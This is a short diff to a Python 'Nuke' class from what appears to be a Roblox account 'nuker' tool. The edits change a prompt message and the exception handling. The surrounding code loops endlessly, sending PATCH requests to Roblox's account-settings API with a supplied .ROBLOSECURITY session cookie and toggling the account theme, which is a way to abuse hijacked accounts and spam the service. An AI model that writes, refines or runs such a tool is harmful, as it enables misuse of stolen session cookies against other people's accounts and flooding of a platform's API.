@@ -45,12 +45,12 @@ class Nuke:
     print("[", end="")
     cprint(" NUKER ", "yellow", end="")
     print("] " , end="")
-    cprint("Press Ctrl + C", "yellow")
+    cprint("Press Ctrl + C to stop", "yellow")
     try:
       while True:
         requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers,data={"themeType": "Light"})
         requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers,data={"themeType": "Dark"})
-    except:
+    except KeyboardInterrupt:
       print("[", end="")
       cprint(" NUKER ", "magenta", end="")
       print("] " , end="")
